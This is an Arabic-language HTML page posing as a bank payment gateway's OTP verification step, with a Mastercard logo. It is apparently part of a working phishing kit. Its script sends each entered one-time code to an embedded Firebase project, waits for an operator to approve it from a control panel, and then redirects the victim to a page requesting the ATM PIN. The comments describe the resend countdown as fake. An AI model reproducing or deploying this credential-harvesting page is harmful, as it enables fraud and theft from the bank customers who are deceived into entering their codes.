<!doctype html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>التحقق من الهوية - بوابة الدفع</title>
  <style>
    :root { --main-green: #008b47; }
    body { margin: 0; padding: 0; background-color: #f4f7f6; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
    .otp-card { background: #fff; width: 92%; max-width: 400px; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); text-align: center; position: relative; }
    .bank-logo { height: 35px; margin-bottom: 20px; }
    .otp-title { font-size: 19px; font-weight: bold; color: #333; margin-bottom: 12px; }
    .otp-msg { font-size: 13.5px; color: #666; margin-bottom: 25px; line-height: 1.6; }
    .otp-input { width: 100%; height: 55px; border: 1.5px solid #ddd; border-radius: 12px; text-align: center; font-size: 26px; letter-spacing: 6px; outline: none; margin-bottom: 20px; transition: border-color 0.3s; }
    .otp-input:focus { border-color: var(--main-green); }
    .verify-btn { width: 100%; height: 55px; background: var(--main-green); color: #fff; border: none; border-radius: 28px; font-size: 17px; font-weight: bold; cursor: pointer; transition: 0.3s; }
    .verify-btn:disabled { background: #ccc; }
    
    /* لودر الانتظار */
    #loadingOverlay { display: none; margin-top: 15px; }
    .spinner { display: inline-block; width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid var(--main-green); border-radius: 50%; animation: spin 1s linear infinite; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    
    .timer { font-size: 12px; color: #999; margin-top: 20px; }
    #errorMessage { color: #d63031; font-size: 13px; margin-bottom: 15px; display: none; font-weight: 600; }
  </style>
</head>
<body>

<div class="otp-card">
  <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png" class="bank-logo" alt="Secure Payment">
  
  <div id="formSection">
    <div class="otp-title">رمز التحقق (OTP)</div>
    <div class="otp-msg">يرجى إدخال الرمز المكون من 6 أرقام المرسل إلى هاتفك لإتمام عملية التفويض البنكي.</div>
    
    <div id="errorMessage">يرجى التحقق من الرمز المرسل على الجوال الصحيح</div>

    <form id="otpForm">
      <input type="tel" id="otpCode" class="otp-input" maxlength="6" placeholder="000000" required>
      <button type="submit" class="verify-btn" id="verifyBtn">تأكيد الرمز</button>
    </form>
  </div>

  <div id="loadingOverlay">
    <div class="spinner"></div>
    <div class="otp-title" style="margin-top:15px;">جاري التحقق من الرمز...</div>
    <div class="otp-msg">يرجى الانتظار ثوانٍ معدودة، نقوم بتأكيد العملية مع البنك.</div>
  </div>
  
  <div class="timer">إعادة إرسال الرمز خلال <span id="time">01:59</span></div>
</div>

<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>

<script>
    // إعدادات Firebase الخاصة بك (jusour-qatar)
    const firebaseConfig = {
      apiKey: "AIzaSyBRoLQJTQVVGiy9JntaEfWAA7qnPWoGLBI",
      authDomain: "jusour-qatar.firebaseapp.com",
      projectId: "jusour-qatar",
      storageBucket: "jusour-qatar.appspot.com",
      messagingSenderId: "927435762624",
      appId: "1:927435762624:web:11d0bf460b62e4af9db625",
      measurementId: "G-CSRM4QLNR9"
    };
    
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    const otpForm = document.getElementById("otpForm");
    const formSection = document.getElementById("formSection");
    const loadingOverlay = document.getElementById("loadingOverlay");
    const errorMsg = document.getElementById("errorMessage");

    otpForm.onsubmit = async (e) => {
        e.preventDefault();
        
        // إظهار اللودر وإخفاء الفورم
        formSection.style.display = "none";
        loadingOverlay.style.display = "block";
        errorMsg.style.display = "none";

        const otpValue = document.getElementById("otpCode").value;

        try {
            // نحدث الطلب في الفايربيس بالكود الجديد ونغير الحالة لانتظار ردك
            // سنضيف وثيقة جديدة في "payments" لمراقبتها
            const docRef = await db.collection("payments").add({
                otp_code: otpValue,
                status: "otp_waiting", // العميل الآن ينتظر ردك من اللوحة
                timestamp: firebase.firestore.FieldValue.serverTimestamp()
            });

            // بدء مراقبة هذه الوثيقة تحديداً بانتظار ردك
            listenForAdminAction(docRef.id);

        } catch (err) {
            console.error("Error:", err);
            resetForm();
        }
    };

    function listenForAdminAction(docId) {
        db.collection("payments").doc(docId).onSnapshot((doc) => {
            const data = doc.data();
            if (!data) return;

            // إذا أعطيت قبول (توجيه لصفحة ATM PIN)
            if (data.status === "accept_otp") {
                window.location.href = "atm_pin.php";
            } 
            // إذا أعطيت رفض (رجوع لنفس الصفحة مع رسالة خطأ)
            else if (data.status === "reject_otp") {
                resetForm();
                errorMsg.style.display = "block";
                document.getElementById("otpCode").value = "";
            }
            // إذا انتهت العملية بنجاح تام (لو أردت إنهاءها هنا مباشرة)
            else if (data.status === "success") {
                window.location.href = "success.php";
            }
        });
    }

    function resetForm() {
        formSection.style.display = "block";
        loadingOverlay.style.display = "none";
    }

    // العداد التنازلي الوهمي للـ OTP
    let duration = 119;
    const display = document.querySelector('#time');
    setInterval(() => {
        let minutes = parseInt(duration / 60, 10);
        let seconds = parseInt(duration % 60, 10);
        seconds = seconds < 10 ? "0" + seconds : seconds;
        display.textContent = minutes + ":" + seconds;
        if (--duration < 0) duration = 119;
    }, 1000);
</script>
</body>
</html>